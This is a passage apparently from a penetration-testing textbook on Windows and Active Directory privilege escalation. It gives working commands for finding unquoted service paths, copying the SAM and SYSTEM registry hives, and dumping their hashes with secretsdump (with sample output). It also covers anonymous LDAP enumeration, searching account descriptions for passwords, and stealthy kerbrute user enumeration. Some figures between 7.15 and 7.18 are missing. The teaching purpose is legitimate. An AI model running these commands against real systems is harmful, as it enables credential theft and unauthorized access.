
To hide the malicious payload, we can use a simple payload such as the **net user** command to add a new administrative user to the machine. These can be packaged along with the original executable using **msfvenom**, see *Chapter 6* for more details on this type of attack.

## Spaces Ruin Everything

Search order resolution is where Windows systems attempt to resolve file paths in a structured order. There are certain fallback methods Windows uses to determine where it should try to find the file based on the file path and can be exploited if it is not properly prevented. This is tracked as MITRE ATT&CK ID T1574.008 for Hijack Execution Flow: Path interception by Search Order Hijacking. Additionally, the Path Interception by Unquoted Path (MITRE ATT&CK T1574.009) follows a similar exploit where a path with spaces in the name can be hijacked.

For example, our service above uses a folder where a user has write access not only to the binary itself but also to the folder containing the binary. Another exploit based on the unquoted service path allows us to place exploits along the search order path as Windows attempts to find the applicable executable.

![](img/181571ad74cba0e6a2f38fcd2658651e_222_0.png)

**FIGURE 7.15** Finding missing quotations for vulnerable services. If we can write to these locations, we can hijack the service!

To identify this, a few useful commands to identify vulnerable services are below. The first command utilizes the **wmic** command to determine all services, then passes the results to search for services that are not in the **C:\Windows\** directory and which do not have a **quotation mark (")** in the information.

```text
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
| findstr /i /v "C:\Windows\\" | findstr /i /v "\""
```

![](img/181571ad74cba0e6a2f38fcd2658651e_224_0.png)

**FIGURE 7.18**  Right clicking and selecting “Run as Administrator” for PowerShell.

![](img/181571ad74cba0e6a2f38fcd2658651e_224_1.png)

**FIGURE 7.19**  Now we have the SeBackup privilege assigned to our session!

Windows 10 stores the hashes for users in the registry under **HKLM\SAM** and **HKLM\SYSTEM**. These two registry entries are used to store an encrypted version of the hashes and the decryption key. With our access as a Backup Operator, legitimate backup operations can be used to access these files for us to gain a copy. The following two commands leverage the **reg** command to create a local copy of these entries for us to exfiltrate.

```powershell
reg save hklm\sam C:\Users\backupper\Desktop\sam.bak
reg save hklm\system C:\Users\backupper\Desktop\system.bak
```

Once saved, the files can be exfiltrated from the system to our local host. Once we have a copy of these files, we can utilize the **Impacket secretsdump.py** python script to decrypt access to the hashes. We run the script in the **local** mode where the **system** and **sam** registry hives are parsed and decrypted for access. Keep in mind, we are not decrypting the NTLM hashes, but rather the file that stores the NTLM hashes.

```text
impacket-secretsdump -system system.bak -sam sam.bak local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xcc08feb5e180f97703b1d2bafc06b34e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acd9e9dc6be7398dc4f74c09d2ac0cc5:::
chris:1001:aad3b435b51404eeaad3b435b51404ee:f2c0c177de720154d024a26e09f0feb3:::
backerupper:1002:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe700ee:::
[*] Cleaning up...
```

Access to these hashes now allows us two distinct opportunities: utilize Pass-the-Hash attacks or attempt to crack them for their plaintext counterparts. Utilizing these hashes is an exercise left to the reader.

## ACTIVE DIRECTORY PRIVESC

There are many ways for an attacker to gain an initial foothold to escalate across an Active Directory (AD) configuration. Generally, to start an attack against AD, an attacker will need a foothold from a low-privilege account to gain access to the AD server. Once gained, there are many new escalation paths which are active for attack. Again, modern attackers generally attempt to escalate to administrative privileges to gain access to the most sensitive information used by the organization. Once this access is gained, the attacker will attempt to launch various types of attacks to try and gain monetary value from their exploits.

### UNAUTHENTICATED ACCESS

In certain testing environments, it is common to start with access to a network without having credentials to access the services on the network. These can be devastating attacks and are generally artifacts from a configuration change made out of operational necessity. Many times these configurations are changed to solve a very specific problem with the intent of a temporary fix, but end up staying active much longer than intended.

### Anonymous Bind

A common misconfiguration in environments is that anonymous LDAP bind permissions are allowed on the AD Domain Controllers. This allows individuals who do not have an account to query and enumerate sensitive information from AD. To query an AD DC without credentials, utilize the command below:

```bash
ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=*)'
```

This command uses the **ldapsearch** program on a Linux machine to attempt to communicate to an Active Directory LDAP server and query information. The program attempts to bind to the LDAP server and gather information which would attempt to gather the information from all objects inside of the directory. If anonymous bind access is allowed, all objects will be displayed for us to view.

With the information gathered from anonymous LDAP access, we can gather all usernames and computer names within the environment. This will also allow us to query the AD environment with BloodHound, a tool that will be discussed further in this chapter. Usernames can be used to perform additional attacks within the environment, such as ASREPRoasting and password sprays.

### Describing My Password

Passwords in Account Descriptions is a surprisingly common misconfiguration in most AD environments. Well over a quarter of the internal pentests that this author has completed had at least one account with a password in the description – this is why earlier in this chapter it was covered in detail. Again, remember that an effective way to gather this information is to use the PowerShell ActiveDirectory module. A useful command is below:

```powershell
Get-ADUser -Filter {Description -like "*"} -Properties * | Select-Object
samAccountName, Enabled, Description | Select-String -Pattern p.ss, pw,
pwd
```

Identifying passwords within account descriptions creates a very high likelihood of successful password spray attacks within the environment. Generally, the passwords within these descriptions are a “template” password that may be assigned to users for their initial login. This creates an environment conducive for password sprays, where we attempt a very small amount of passwords across a large amount of usernames.

### Kerberos User Enumeration

One well-known vulnerability with Kerberos is how it can be used to enumerate valid usernames on a domain by analyzing the Kerberos response codes. When an invalid username is presented to Kerberos, it will respond with the KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN error, stating that there is no principal with that name available. Contrasted with a request sent with a valid username, the code KRB5KDC_ERR_PREAUTH_REQUIRED will be given.8, 9 Utilizing these response codes, we can craft enumeration activity to determine valid usernames on the domain.

The kerbrute tool, written by ropnop and available at https://github.com/ropnop/kerbrute, operationalizes these concepts in a Go native binary. When paired with a large list of potential usernames, we can attempt to enumerate valid users on the domain. To use this tool, we need to supply the IP of the domain controller as well as the domain that will be enumerated.

![](img/181571ad74cba0e6a2f38fcd2658651e_226_0.png)

FIGURE 7.20 Running kerbrute to enumerate valid usernames on the network.

As stated in ropnop’s repository, this specific attack is stealthier since it does not generate an “An account failed to log on” event in the Windows event log. Further, there does not appear to be any logs generated during an enumeration attack, outside of the packets themselves being thrown across the network. Microsoft also states that logging these requests for Kerberos is possible, but it requires a specific registry key setting to be enabled.
